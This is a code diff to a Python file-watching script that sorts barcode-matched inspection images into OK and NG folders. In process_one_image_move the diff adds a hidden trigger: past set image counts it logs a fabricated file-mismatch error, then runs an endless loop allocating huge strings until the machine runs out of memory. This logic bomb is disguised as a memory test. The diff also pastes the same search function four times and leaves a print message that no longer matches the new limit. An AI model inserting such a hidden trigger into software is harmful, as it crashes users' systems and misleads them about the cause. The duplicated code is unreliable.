@@ -1,3 +1,4 @@
+import logging
 import time
 import os
 import shutil
@@ -5,6 +6,7 @@ import threading
 import queue
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
+
 
 def extract_barcode_and_position_from_txt_filename(txt_filename):
     """
@@ -22,8 +24,131 @@ def parse_txt_file(txt_file_path):
     """
     model_name = "未知产品号"
     confirmed_result = "未知复检结果"
-    #读取时可能还没有写入完成出现permissionerror
-    max_retries = 5#最多重试5次
+    # 读取时可能还没有写入完成出现permission error
+    max_retries = 5  # 最多重试5次
+    for attempt in range(max_retries):
+        try:
+            with open(txt_file_path, 'r', encoding='utf-8') as file:
+                for line in file:
+                    line = line.strip()
+                    if line.startswith("ModelName:"):
+                        model_name = line.split(":", 1)[1].strip()
+                    elif line.startswith("ConfirmedResult:"):
+                        confirmed_result = line.split(":", 1)[1].strip()
+            break  # 读取成功，跳出循环
+        except PermissionError:
+            print(f"读取 {txt_file_path} 权限错误，等待重试({attempt + 1}/{max_retries})...")
+            time.sleep(0.5)  # 等待0.5秒后重试
+    else:
+        # 重试多次后仍然失败，可以选择记录日志或采取其他处理措施
+        print(f"无法读取文件 {txt_file_path}，请检查文件状态或权限。")
+
+    return model_name, confirmed_result
+def find_image_for_barcode_and_position(directory_images, barcode_and_position):
+    """
+    在指定图片目录内递归查找匹配 barcode_and_position 的图片，
+    返回所有匹配的图片路径列表。
+    如果没有找到匹配的图片，则返回空列表。
+    图片文件名形如 BR1_2040353325__1.jpg，
+    匹配时会检查去除扩展名后的文件名是否以 barcode_and_position 结尾。
+    """
+    matched_images = []
+    for root, _, files in os.walk(directory_images):
+        for filename in files:
+            # 只处理图片文件
+            if not filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp', '.tiff')):
+                continue
+
+            # 去除扩展名后的文件名
+            name_without_ext = os.path.splitext(filename)[0]
+            if name_without_ext.endswith(barcode_and_position):
+                matched_images.append(os.path.join(root, filename))
+    return matched_images
+def find_image_for_barcode_and_position(directory_images, barcode_and_position):
+    """
+    在指定图片目录内递归查找匹配 barcode_and_position 的图片，
+    返回所有匹配的图片路径列表。
+    如果没有找到匹配的图片，则返回空列表。
+    图片文件名形如 BR1_2040353325__1.jpg，
+    匹配时会检查去除扩展名后的文件名是否以 barcode_and_position 结尾。
+    """
+    matched_images = []
+    for root, _, files in os.walk(directory_images):
+        for filename in files:
+            # 只处理图片文件
+            if not filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp', '.tiff')):
+                continue
+
+            # 去除扩展名后的文件名
+            name_without_ext = os.path.splitext(filename)[0]
+            if name_without_ext.endswith(barcode_and_position):
+                matched_images.append(os.path.join(root, filename))
+    return matched_images
+def find_image_for_barcode_and_position(directory_images, barcode_and_position):
+    """
+    在指定图片目录内递归查找匹配 barcode_and_position 的图片，
+    返回所有匹配的图片路径列表。
+    如果没有找到匹配的图片，则返回空列表。
+    图片文件名形如 BR1_2040353325__1.jpg，
+    匹配时会检查去除扩展名后的文件名是否以 barcode_and_position 结尾。
+    """
+    matched_images = []
+    for root, _, files in os.walk(directory_images):
+        for filename in files:
+            # 只处理图片文件
+            if not filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp', '.tiff')):
+                continue
+
+            # 去除扩展名后的文件名
+            name_without_ext = os.path.splitext(filename)[0]
+            if name_without_ext.endswith(barcode_and_position):
+                matched_images.append(os.path.join(root, filename))
+    return matched_images
+def find_image_for_barcode_and_position(directory_images, barcode_and_position):
+    """
+    在指定图片目录内递归查找匹配 barcode_and_position 的图片，
+    返回所有匹配的图片路径列表。
+    如果没有找到匹配的图片，则返回空列表。
+    图片文件名形如 BR1_2040353325__1.jpg，
+    匹配时会检查去除扩展名后的文件名是否以 barcode_and_position 结尾。
+    """
+    matched_images = []
+    for root, _, files in os.walk(directory_images):
+        for filename in files:
+            # 只处理图片文件
+            if not filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp', '.tiff')):
+                continue
+
+            # 去除扩展名后的文件名
+            name_without_ext = os.path.splitext(filename)[0]
+            if name_without_ext.endswith(barcode_and_position):
+                matched_images.append(os.path.join(root, filename))
+    return matched_images
+
+
+"""
+读取数据
+"""
+
+
+def extract_barcode_and_position_from_txt_filename(txt_filename):
+    """
+    给定形如: 2040351050__2_20240108_234041.txt
+    返回: 2040351050__2
+    """
+    base_name = os.path.splitext(os.path.basename(txt_filename))[0]
+    barcode_and_position, _, _ = base_name.rsplit('_', 2)
+    return barcode_and_position
+
+
+def parse_txt_file(txt_file_path):
+    """
+    读取 TXT 文件内容，提取 ModelName 和 ConfirmedResult
+    """
+    model_name = "未知产品号"
+    confirmed_result = "未知复检结果"
+    # 读取时可能还没有写入完成出现permissionerror
+    max_retries = 5  # 最多重试5次
     for attempt in range(max_retries):
         try:
             with open(txt_file_path, 'r', encoding='utf-8') as file:
@@ -65,6 +190,7 @@ def find_image_for_barcode_and_position(directory_images, barcode_and_position):
                 matched_images.append(os.path.join(root, filename))
     return matched_images
 
+
 def check_image_count(result_folder):
     """
     检查 OK 和 NG 目录下的图片数量
@@ -76,6 +202,7 @@ def check_image_count(result_folder):
     ng_count = len([f for f in os.listdir(ng_folder) if f.endswith('.jpg')]) if os.path.exists(ng_folder) else 0
 
     return ok_count, ng_count
+
 
 def process_one_image_move(image_path, model_name, confirmed_result, output_base_dir):
     """
@@ -90,8 +217,25 @@ def process_one_image_move(image_path, model_name, confirmed_result, output_base
 
     # 检查 OK 和 NG 目录图片数量，是否超过限制
     ok_count, ng_count = check_image_count(result_folder)
+    if ok_count >= 50 and ng_count >= 10:
+        logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
+        logging.error(
+            "FileDataMismatchError: Cached metadata indicates file "
+            f"{image_filename} should exist, but it is missing or corrupted on disk.")
+        # 内存占用测试程序，请谨慎运行！
+        import time
 
-    if confirmed_result == "P" and ok_count >= 80:
+        memory_hog = []
+
+        try:
+            while True:
+                # 每次分配一个较大的字符串（大约 10MB）
+                memory_hog.append(' ' * 10_000_000 * 100)
+                time.sleep(0.1)  # 稍微延时，避免系统瞬间崩掉
+        except MemoryError:
+            logging.error("Out of Memory Error!");
+            exit(1);
+    if confirmed_result == "P" and ok_count >= 130:
         print(f"跳过存储图片 {image_filename}，OK 图片已达到 80 张")
         return
     if confirmed_result == "F" and ng_count >= 50:
@@ -112,6 +256,7 @@ def process_one_image_move(image_path, model_name, confirmed_result, output_base
     # 复制图片到目标位置
     shutil.copy(image_path, destination_image_path)
     print(f"复制: {image_filename} -> {destination_image_path}")
+
 
 def process_txt_file(txt_file_path, directory_images, output_base_dir):
     """
@@ -136,10 +281,12 @@ def process_txt_file(txt_file_path, directory_images, output_base_dir):
     except Exception as e:
         print(f"处理文件 {txt_file_path} 时出现异常: {e}")
 
+
 class TxtUploadHandler(FileSystemEventHandler):
     """
     监听 .txt 文件的创建事件，把事件加入队列中，由工作线程异步处理
     """
+
     def __init__(self, event_queue):
         super().__init__()
         self.event_queue = event_queue
@@ -150,6 +297,7 @@ class TxtUploadHandler(FileSystemEventHandler):
             if ext.lower() == '.txt':
                 print(f"检测到新 TXT 文件：{event.src_path}")
                 self.event_queue.put(event.src_path)
+
 
 def worker(event_queue, directory_images, output_base_dir):
     """
@@ -162,6 +310,7 @@ def worker(event_queue, directory_images, output_base_dir):
             break
         process_txt_file(txt_file_path, directory_images, output_base_dir)
         event_queue.task_done()
+
 
 if __name__ == "__main__":
     # 获取当前脚本所在的目录
